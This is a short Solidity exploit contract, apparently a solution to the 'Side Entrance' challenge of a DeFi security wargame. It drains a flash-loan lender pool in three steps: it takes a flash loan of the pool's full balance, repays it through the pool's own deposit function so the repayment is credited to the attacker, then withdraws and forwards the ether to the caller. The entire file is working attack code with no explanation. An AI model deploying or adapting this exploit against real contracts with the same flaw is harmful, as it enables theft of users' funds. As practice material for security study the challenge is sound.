// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./SideEntranceLenderPool.sol";

contract AttackSideEntrance {
    SideEntranceLenderPool private pool;

    constructor(address _pool) {
        pool = SideEntranceLenderPool(_pool);
    }

    function attack() external {
        pool.flashLoan(address(pool).balance);
        pool.withdraw();
        (bool s, ) = msg.sender.call{value: address(this).balance}("");
        require(s);
    }

    function execute() external payable {
        pool.deposit{value: msg.value}();
    }

    receive() external payable {}
}
